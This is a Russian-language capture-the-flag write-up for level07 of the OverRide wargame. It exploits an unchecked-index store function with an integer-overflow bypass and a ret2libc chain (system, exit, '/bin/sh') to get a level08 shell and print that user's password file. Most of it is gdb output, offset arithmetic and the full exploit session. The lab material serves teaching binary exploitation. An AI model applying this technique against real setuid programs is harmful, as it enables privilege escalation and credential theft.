[back](../defense.md)

В каталоге этого уровня прога принадлежит владельцу следующего уровня

```
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
```

Посмотрим, что делает прога:

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil s crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------
Input command: store
 Failed to do ыstore command
Input command: command
Input command: store
 Number: 21
 Index: 21
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 21
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 21
 Completed read command successfully
Input command: quit
level07@OverRide:~$
```

Посмотрим код:

```
(gdb) i func
    0x080485c4  clear_stdin            
    0x080485e7  get_unum                ; read number from stdin
    0x0804861f  prog_timeout
    0x08048630  store_number            
    0x080486d7  read_number            
    0x08048723  main                    
```

Код содержит интересные нам функции: read_number, store_number, get_unum, clear_stdin и main.

Программа предоставляет нам 3 команды:

- quit (что позволяет нам выйти из программы), 

- store (сохранение числа в массиве) и 

- read (для чтения любого поля в этом массиве).

Но функция чтения индекс не проверяет, а для функции сохранения у нас есть два ограничения: индекс не может быть кратен 3 и номер не может начинаться с 0xb7000000 (системный вызов).

Попытаемся переопределить системный вызов и попытаться перезаписать адрес, содержащий EIP (is a register in x86 architectures (32bit). 

It holds the "Extended Instruction Pointer" for the stack. 

In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.)

вызовом system() + exit() + "/bin/sh" для выполнения ret2libc.

Для этого надо: 

- найти адрес system(), exit(), bin/sh

- рассчитать «индекс» EIP

- использовать переполнение maxint для доступа к защищенным индексам

- запустить эксплойт, введя вредоносный номер + индекс для запущенной программы

Ищем адреса system(), exit(), bin/shsh

```
(gdb) b *main
    Breakpoint 1 at 0x8048723
(gdb) r
    Starting program: /home/users/level07/level07
    Breakpoint 1, 0x08048723 in main ()
(gdb) p system
    $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
    $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
    0xf7f897ec
    warning: Unable to access target memory at 0xf7fd3b74, halting search.
    1 pattern found.
(gdb) x/s 0xf7f897ec
    0xf7f897ec:	 "/bin/sh"
```

Теперь у нас есть адреса:

```
0xf7e6aed0 <system> = 4159090384
0xf7e5eb70 <exit> = 4159040368
0xf7f897ec:	 "/bin/sh" = 4160264172
```

Теперь ищем смещение и адрес нашей таблицы
```
(gdb) b *main+520
Breakpoint 1 at 0x804892b
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil s crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------
Input command: read
Breakpoint 1, 0x0804892b in main () ;0x0804892b <+520>:	call   0x80486d7 <read_number>
(gdb) i f
    Stack level 0, frame at 0xffffd6d0:
    eip = 0x804892b in main; saved eip 0xf7e45513
    Arglist at 0xffffd6c8, args:
    Locals at 0xffffd6c8, Previous frames sp is 0xffffd6d0
    Saved registers:
    ebx at 0xffffd6bc, ebp at 0xffffd6c8, esi at 0xffffd6c0, edi at 0xffffd6c4, eip at 0xffffd6cc (последний адрес eip)
(gdb) i r
    eax            0xffffd504	-11004      ; адрес начала массива
    ecx            0xffffd600	-10752
    edx            0xffffd600	-10752
    ebx            0xffffd504	-11004
    esp            0xffffd4e0	0xffffd4e0
    ebp            0xffffd6c8	0xffffd6c8
    esi            0xffffd69c	-10596
    edi            0x8048d65	134516069
    eip            0x804892b	0x804892b <main+520>
    eflags         0x246	[ PF ZF IF ]
    cs             0x23	35
    ss             0x2b	43
    ds             0x2b	43
    es             0x2b	43
    fs             0x0	0
    gs             0x63	99

0xffffd504, хранящийся в $eax (первый аргумент read_number), а адрес eip — 0xffffd6cc.
Вычитая одно из другого получаем смещение. Т.к. у нас 4 таблицы, делим на 4.
(gdb) p 0xffffd6cc - 0xffffd504
$1 = 456
(gdb) p 456 / 4
$2 = 114
Итак, смещение составляет 456 байт или 114 целых чисел.
Записать напрямую в 114 из-за ограничения, кратного 3, в read_number.
Поэтому мы попытаемся выполнить переполнение для записи на этот адрес. Таким образом, мы вычисляем:
UINT_MAX (4294967295 + 1) / 4 + 114 = 1073741938
UINT_MAX + 1 переполнение

Получаем адреса, необходимые для создания ret2libc:
system(): 0xf7e6aed0: 4159090384
exit(): 0xf7e5eb70: 4159040368
"/bin/sh": 0xf7f897ec: 4160264172

В массиве по индексу 114 мы поместим системный адрес, 
по индексу 115 exit и по индексу 116 "/bin/sh".

Пробуем:
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wils crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
    level08
$ cat /home/users/level08/.pass
    7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
Уровень пройден.

[back](../defense.md)
